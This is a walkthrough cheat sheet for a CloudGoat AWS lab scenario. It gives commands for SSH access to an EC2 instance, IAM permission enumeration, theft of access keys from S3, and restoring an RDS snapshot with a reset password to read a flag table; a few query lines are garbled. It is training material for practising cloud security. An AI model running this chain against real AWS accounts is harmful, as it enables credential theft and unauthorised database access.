## Cheat Sheet


An attacker can gain access to a hijacked EC2 instance.


`cd RDS_Snapshot_cgid528tilly5h`


`ssh ec2-user@54.242.220.178 -i ./cloudgoat`


```
[ubuntu@ip-172-31-20-221 ~]$
```


An attacker can list AWS credentials on the server (enumirate)


`aws sts get-caller-identity`


The attacker can check the permissions for the roles granted on EC2.


```
#Check the instance profiles
aws iam list-instance-profiles

aws iam list-role-policies --role-name cg-ec2-admin-role

aws iam get-role-policy --role-name cg-ec2-admin-role --policy-name cg-ec2-admin-policy
```


The attacker sees that S3 is accessible and steals the credentials.
```
aws s3 ls

aws s3 cp s3://cloudgoat/access_keys.txt .
```
The attacker accesses the stolen credentials.
```
aws configure --profile david
```
The attacker checks the permissions of the stolen credentials.
```
aws iam get-user --profile david


aws iam list-user-policies --user-name cg-rds-instance-user-RDS_Snapshot_cgidy7ybygks75 --profile david


aws iam get-user-policy --user-name cg-rds-instance-user-RDS_Snapshot_cgidy7ybygks75 --policy-name cg-david-policy --profile david


# The attacker verifies that he has RDS-related privileges
```

The attacker restores the RDS snapshot.

```
#Verify the information in the RDS snapshot
aws rds describe-db-instances --profile david

aws rds describe-db-snapshots --db-instance-identifier cg-rds


#Restore the RDS snapshot
aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier attack-rds \
    --db-snapshot-identifier cg-rds-snapshot \
    --db-subnet-group-name cg-db-subnet-group \
    --vpc-security-group-ids sg-xxxxxxxxxxxxxxxxx \
    --profile david


#Wait for a new instance to be created


#Modify the RDS instance password
aws rds modify-db-instance \
    --db-instance-identifier attack-rds \
    --master-user-password attack1234! \
    --apply-immediately \
    --profile david


#Verify the master username
aws rds describe-db-instances --db-instance-identifier attack-rds --query \ "DBInstances[.1].1
"DBInstances[].MasterUsername" --profile david


#Determine the MySQL endpoint address
aws rds describe-db-instances --db-instance-identifier attack-rds --query \ "DBInstances[.
"DBInstances[].Endpoint.Address" --profile david


```


The attacker accesses the restored DB and hijacks the FLAG.
```
mysql -h attack-rds.cxxxxxxxxxxx.us-east-1.rds.amazonaws.com -P 3306 -u cgadmin -pattack1234!
show databases;
use mydatabase;
show tables;
select * from flag;
```
# Caveats
At the end of the scenario, the instance created by the Restore job is not deleted by ./cloudgoat.py destroy rds_snapshot. You need to delete it manually.
